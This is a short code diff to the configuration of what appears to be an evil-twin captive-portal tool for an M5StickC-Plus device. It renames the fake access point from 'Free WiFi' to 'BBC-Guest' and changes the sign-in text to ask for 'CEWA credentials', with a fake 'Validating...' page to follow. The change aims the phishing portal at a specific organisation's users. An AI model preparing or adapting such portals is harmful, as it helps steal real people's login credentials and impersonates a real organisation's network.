@@ -8,10 +8,10 @@
 // modified font and text placement for StickC-Plus, further improvements added
 
 // User configuration
-#define SSID_NAME "Free WiFi"
+#define SSID_NAME "BBC-Guest"
 #define SUBTITLE "Free WiFi service."
 #define TITLE "Sign in:"
-#define BODY "Create an account to get connected to the internet."
+#define BODY "Insert CEWA credentials to continue."
 #define POST_TITLE "Validating..."
 #define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
 #define PASS_TITLE "Credentials"
